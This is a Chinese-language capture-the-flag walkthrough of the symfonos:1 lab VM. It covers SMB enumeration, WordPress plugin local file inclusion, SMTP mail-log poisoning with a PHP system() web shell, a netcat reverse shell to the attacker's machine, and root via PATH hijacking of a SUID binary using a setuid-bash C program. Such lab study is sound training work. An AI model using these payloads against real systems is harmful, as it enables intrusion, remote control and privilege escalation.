# symfonos
## SMB -> 找到wordpress -> wpscan找到插件->有Mail Masta 1.0 - Local File Inclusion->通過SMTP發送電子郵件將LFI變成RCE->PATH提權
`如果您的用戶具有寫入權限的文件夾位於路徑中，您可能會劫持應用程序以運行腳本。Linux中的PATH是一個環境變量，它告訴操作系統在哪裡搜索可執行文件。對於任何未內置於 shell 或未使用絕對路徑定義的命令，Linux 將開始在 PATH 下定義的文件夾中進行搜索。`
```
┌──(root💀kali)-[/home/kali]
└─# nmap -sC -sV -p- -T5 192.168.0.17
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 13:49 EDT
Nmap scan report for 192.168.0.17
Host is up (0.00051s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:26:EA:9C (VMware)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2022-04-19T12:49:54-05:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-04-19T17:49:54
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.17 seconds

```
## smbclient
```
┌──(kali㉿kali)-[~]
└─$ smbclient -L 192.168.0.17 -U guest 
Enter WORKGROUP\guest's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SYMFONOS


┌──(kali㉿kali)-[~]
└─$ smbclient -U guest //192.168.0.17/anonymous                                                                          1 ⨯
Enter WORKGROUP\guest's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 28 21:14:49 2019
  ..                                  D        0  Fri Jun 28 21:12:15 2019
  attention.txt                       N      154  Fri Jun 28 21:14:49 2019

                19994224 blocks of size 1024. 17300024 blocks available
smb: \> get attention.txt 
getting file \attention.txt of size 154 as attention.txt (75.2 KiloBytes/sec) (average 75.2 KiloBytes/sec)
smb: \> exit


┌──(kali㉿kali)-[~]
└─$ cat attention.txt 

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus

```
## helios   passwords like 'epidioko', 'qwerty' and 'baseball'!
```
┌──(kali㉿kali)-[~]
└─$ smbclient -U helios //192.168.0.17/helios                                                                                                                                                                                           
Enter WORKGROUP\helios's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 28 20:32:05 2019
  ..                                  D        0  Fri Jun 28 20:37:04 2019
  research.txt                        A      432  Fri Jun 28 20:32:05 2019
  todo.txt                            A       52  Fri Jun 28 20:32:05 2019

                19994224 blocks of size 1024. 17298428 blocks available
smb: \> get research.txt 
getting file \research.txt of size 432 as research.txt (210.9 KiloBytes/sec) (average 210.9 KiloBytes/sec)
smb: \> get todo.txt 
getting file \todo.txt of size 52 as todo.txt (25.4 KiloBytes/sec) (average 118.2 KiloBytes/sec)
smb: \> 

```

```
┌──(kali㉿kali)-[~]
└─$ cat research.txt 
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sunourney in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant b
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ cat todo.txt    

1. Binge watch Dexter
2. Dance
3. Work on /h3l105

```

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://symfonos.local/h3l105/ -t 64 -w /usr/share/dirb/wordlists/common.txt -x html,htm,asp,php      1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://symfonos.local/h3l105/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,htm,asp,php
[+] Timeout:                 10s
===============================================================
2022/04/19 14:22:53 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 305]
/.htaccess.asp        (Status: 403) [Size: 309]
/.htaccess.php        (Status: 403) [Size: 309]
/.htaccess.html       (Status: 403) [Size: 310]
/.htaccess.htm        (Status: 403) [Size: 309]
/.hta                 (Status: 403) [Size: 300]
/.hta.html            (Status: 403) [Size: 305]
/.hta.htm             (Status: 403) [Size: 304]
/.hta.asp             (Status: 403) [Size: 304]
/.hta.php             (Status: 403) [Size: 304]
/.htpasswd.php        (Status: 403) [Size: 309]
/.htpasswd            (Status: 403) [Size: 305]
/.htpasswd.html       (Status: 403) [Size: 310]
/.htpasswd.htm        (Status: 403) [Size: 309]
/.htpasswd.asp        (Status: 403) [Size: 309]
/index.php            (Status: 301) [Size: 0] [--> http://symfonos.local/h3l105/]
/index.php            (Status: 301) [Size: 0] [--> http://symfonos.local/h3l105/]
/readme.html          (Status: 200) [Size: 7447]                                 
/wp-admin             (Status: 301) [Size: 326] [--> http://symfonos.local/h3l105/wp-admin/]
/wp-content           (Status: 301) [Size: 328] [--> http://symfonos.local/h3l105/wp-content/]
/wp-includes          (Status: 301) [Size: 329] [--> http://symfonos.local/h3l105/wp-includes/]
/wp-settings.php      (Status: 500) [Size: 0]                                                  
/wp-load.php          (Status: 200) [Size: 0]                                                  
/wp-login.php         (Status: 200) [Size: 3284]                                               
/wp-config.php        (Status: 200) [Size: 0]                                                  
/wp-blog-header.php   (Status: 200) [Size: 0]                                                  
/wp-signup.php        (Status: 302) [Size: 0] [--> http://symfonos.local/h3l105/wp-login.php?action=register]
/wp-mail.php          (Status: 403) [Size: 2759]                                                             
/wp-trackback.php     (Status: 200) [Size: 135]                                                              
/xmlrpc.php           (Status: 405) [Size: 42]                                                               
/wp-cron.php          (Status: 200) [Size: 0]                                                                
/wp-links-opml.php    (Status: 200) [Size: 226]                                                              
/xmlrpc.php           (Status: 405) [Size: 42]                                                               
                                                                                                             
===============================================================
2022/04/19 14:22:59 Finished
===============================================================
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://symfonos.local/h3l105/wp-content/ -t 64 -w /usr/share/dirb/wordlists/common.txt -x html,htm,asp,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://symfonos.local/h3l105/wp-content/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,htm,asp,php
[+] Timeout:                 10s
===============================================================
2022/04/19 14:23:46 Starting gobuster in directory enumeration mode
===============================================================
/.hta.htm             (Status: 403) [Size: 315]
/.hta.asp             (Status: 403) [Size: 315]
/.hta.php             (Status: 403) [Size: 315]
/.hta                 (Status: 403) [Size: 311]
/.hta.html            (Status: 403) [Size: 316]
/.htpasswd            (Status: 403) [Size: 316]
/.htaccess            (Status: 403) [Size: 316]
/.htpasswd.asp        (Status: 403) [Size: 320]
/.htaccess.php        (Status: 403) [Size: 320]
/.htpasswd.php        (Status: 403) [Size: 320]
/.htaccess.html       (Status: 403) [Size: 321]
/.htpasswd.html       (Status: 403) [Size: 321]
/.htpasswd.htm        (Status: 403) [Size: 320]
/.htaccess.htm        (Status: 403) [Size: 320]
/.htaccess.asp        (Status: 403) [Size: 320]
/index.php            (Status: 200) [Size: 0]  
/index.php            (Status: 200) [Size: 0]  
/plugins              (Status: 301) [Size: 336] [--> http://symfonos.local/h3l105/wp-content/plugins/]
/themes               (Status: 301) [Size: 335] [--> http://symfonos.local/h3l105/wp-content/themes/] 
/uploads              (Status: 301) [Size: 336] [--> http://symfonos.local/h3l105/wp-content/uploads/]
/upgrade              (Status: 301) [Size: 336] [--> http://symfonos.local/h3l105/wp-content/upgrade/]
                                                                                                      
===============================================================
2022/04/19 14:23:51 Finished
===============================================================

```
# content

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://symfonos.local/h3l105/wp-content/ -t 64 -w /usr/share/dirb/wordlists/common.txt -x html,htm,asp,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://symfonos.local/h3l105/wp-content/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,htm,asp,php
[+] Timeout:                 10s
===============================================================
2022/04/19 14:23:46 Starting gobuster in directory enumeration mode
===============================================================
/.hta.htm             (Status: 403) [Size: 315]
/.hta.asp             (Status: 403) [Size: 315]
/.hta.php             (Status: 403) [Size: 315]
/.hta                 (Status: 403) [Size: 311]
/.hta.html            (Status: 403) [Size: 316]
/.htpasswd            (Status: 403) [Size: 316]
/.htaccess            (Status: 403) [Size: 316]
/.htpasswd.asp        (Status: 403) [Size: 320]
/.htaccess.php        (Status: 403) [Size: 320]
/.htpasswd.php        (Status: 403) [Size: 320]
/.htaccess.html       (Status: 403) [Size: 321]
/.htpasswd.html       (Status: 403) [Size: 321]
/.htpasswd.htm        (Status: 403) [Size: 320]
/.htaccess.htm        (Status: 403) [Size: 320]
/.htaccess.asp        (Status: 403) [Size: 320]
/index.php            (Status: 200) [Size: 0]  
/index.php            (Status: 200) [Size: 0]  
/plugins              (Status: 301) [Size: 336] [--> http://symfonos.local/h3l105/wp-content/plugins/]
/themes               (Status: 301) [Size: 335] [--> http://symfonos.local/h3l105/wp-content/themes/] 
/uploads              (Status: 301) [Size: 336] [--> http://symfonos.local/h3l105/wp-content/uploads/]
/upgrade              (Status: 301) [Size: 336] [--> http://symfonos.local/h3l105/wp-content/upgrade/]
                                                                                                      
===============================================================
2022/04/19 14:23:51 Finished
===============================================================

```
#http://symfonos.local/h3l105/wp-content/uploads/ --> site editor 
https://www.exploit-db.com/exploits/44340
```
┌──(kali㉿kali)-[~]
└─$ curl http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
Debian-exim:x:105:109::/var/spool/exim4:/bin/false
messagebus:x:106:111::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
helios:x:1000:1000:,,,:/home/helios:/bin/bash
mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:109:115::/var/spool/postfix:/bin/false
{"success":true,"data":{"output":[]}}                                                                                                                             
```
# SMTP +LFI 
```
┌──(kali㉿kali)-[~]
└─$ telnet 192.168.0.17 25
Trying 192.168.0.17...
Connected to 192.168.0.17.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL from:<aaaa>
250 2.1.0 Ok
RCPT to: <Helios>
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['cmd']):?>
.
250 2.0.0 Ok: queued as A0CAB40698

```
`上面吃屎了`
--------------------------------------------------------------------
--------------------------------------------------------------------
--------------------------------------------------------------------
# 以下重新

wpsacn 枚舉插件
```
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://symfonos.local/h3l105 --enumerate p
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://symfonos.local/h3l105/ [192.168.0.17]
[+] Started: Wed Apr 20 07:29:12 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://symfonos.local/h3l105/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://symfonos.local/h3l105/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://symfonos.local/h3l105/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://symfonos.local/h3l105/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://symfonos.local/h3l105/index.php/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>
 |  - http://symfonos.local/h3l105/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: 'Version: 1.4'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt

[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Apr 20 07:29:16 2022
[+] Requests Done: 51
[+] Cached Requests: 5
[+] Data Sent: 11.891 KB
[+] Data Received: 18.652 MB
[+] Memory used: 221.086 MB
[+] Elapsed time: 00:00:04

```
# mail-masta
https://www.exploit-db.com/exploits/40290
用這個才能收到信
```
http://192.168.0.17/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd



root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
Debian-exim:x:105:109::/var/spool/exim4:/bin/false
messagebus:x:106:111::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
helios:x:1000:1000:,,,:/home/helios:/bin/bash
mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:109:115::/var/spool/postfix:/bin/false
```
先看看是不能看到mail內容
http://192.168.0.18/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
```
From root@symfonos.localdomain  Fri Jun 28 21:08:55 2019
Return-Path: <root@symfonos.localdomain>
X-Original-To: root
Delivered-To: root@symfonos.localdomain
Received: by symfonos.localdomain (Postfix, from userid 0)
	id 3DABA40B64; Fri, 28 Jun 2019 21:08:54 -0500 (CDT)
From: root@symfonos.localdomain (Cron Daemon)
To: root@symfonos.localdomain
Subject: Cron <root@symfonos> dhclient -nw
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20190629020855.3DABA40B64@symfonos.localdomain>
Date: Fri, 28 Jun 2019 21:08:54 -0500 (CDT)

/bin/sh: 1: dhclient: not found
.
.
.
.


```

# 再來就去 25 port 送信給helios
```
┌──(kali㉿kali)-[~]
└─$ telnet 192.168.0.19 25                                                                                               1 ⨯
Trying 192.168.0.19...
Connected to 192.168.0.19.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM: DOG                            ## 寄件人
250 2.1.0 Ok
RCPT TO: Helios                           ## 收件人
250 2.1.5 Ok
data                                       ##內容
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['cmd']); ?>
.                                          ##(單一行結束)
250 2.0.0 Ok: queued as 3970940B98
quit
221 2.0.0 Bye
Connection closed by foreign host.

```
## http://192.168.0.19/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=id
```
; Wed, 20 Apr 2022 07:18:58 -0500 (CDT) uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

## 看到有執行id之後 就能去反彈shell
```
http://192.168.0.19/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=nc%20192.168.0.30%208989%20-e%20/bin/bash
```
kali下
```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8989                                                                                                        1 ⨯
listening on [any] 8989 ...
connect to [192.168.0.30] from (UNKNOWN) [192.168.0.19] 40064
python -c 'import pty;pty.spawn("/bin/bash")'
<h3l105/wp-content/plugins/mail-masta/inc/campaign$ 

```
## 提權
```
helios@symfonos:/tmp$ find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck
/bin/mount
/bin/umount
/bin/su
/bin/ping
```
## statuscheck
執行statuscheck 和 用strings statuscheck 可以看見他執行了curl
```
helios@symfonos:/opt$ ls -al    
ls -al
total 20
drwxr-xr-x  2 root root 4096 Jun 28  2019 .
drwxr-xr-x 22 root root 4096 Jun 28  2019 ..
-rwsr-xr-x  1 root root 8640 Jun 28  2019 statuscheck


helios@symfonos:/opt$ strings statuscheck
strings statuscheck
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
http://lH
ocalhostH
```
## kali上寫一個名稱為curl的東西 上傳上去

```
┌──(kali㉿kali)-[/tmp]
└─$ cat curl.c  
int main(void)
{
        setgid(0);
        setuid(0);
        system("/bin/bash");
        return 0;
}

```
```
┌──(kali㉿kali)-[/tmp]
└─$ gcc curl.c -o curl
curl.c: In function ‘main’:
curl.c:3:9: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    3 |         setgid(0);
      |         ^~~~~~
curl.c:4:9: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    4 |         setuid(0);
      |         ^~~~~~
curl.c:5:9: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    5 |         system("/bin/bash");
      |         ^~~~~~
                                                                                                                             
┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 80                                                                     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.0.19 - - [20/Apr/2022 08:49:24] "GET /curl HTTP/1.1" 200 -
```
## 需要把我放curl的 /tmp 加入PATH 並且給他執行的權限
```
helios@symfonos:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
helios@symfonos:/tmp$ $PATH
$PATH
bash: /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin: No such file or directory
helios@symfonos:/tmp$ which curl
which curl
/usr/bin/curl
helios@symfonos:/tmp$ ls -al
ls -al
total 784
drwxrwxrwt  2 root   root     4096 Apr 20 07:49 .
drwxr-xr-x 22 root   root     4096 Jun 28  2019 ..
-rw-r--r--  1 helios helios  16328 Apr 20 07:48 curl
-rwxr-xr-x  1 helios helios 776167 Apr 19 08:06 linpeas.sh
helios@symfonos:/tmp$ chmod +x curl
chmod +x curl
helios@symfonos:/tmp$ which curl
which curl
/tmp/curl
```
## 回去執行statuscheck
會變成執行了我的名稱是curl的東西=root起了一個sgid suid都是0的/bin/bash
```
helios@symfonos:/opt$ ./statuscheck
./statuscheck
root@symfonos:/opt# cd /root
cd /root
root@symfonos:/root# ls
ls
proof.txt
root@symfonos:/root# cat proof.txt
cat proof.txt

        Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                  ;;;;'     (      ---~~/         `:::|       `\\.      
                  |'  _      `----~~~~'      /      `:|        ()))),      
            ______/\/~    |                 /        /         (((((())  
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
        //  \ \                        /  |  \;;,\                 `   
       (<_    \ \                    /',/-----'  _> 
        \_|     \\_                 //~;~~~~~~~~~ 
                 \_|               (,~~   
                                    \~\
                                     ~~

        Contact me via Twitter @zayotic to give feedback!


```
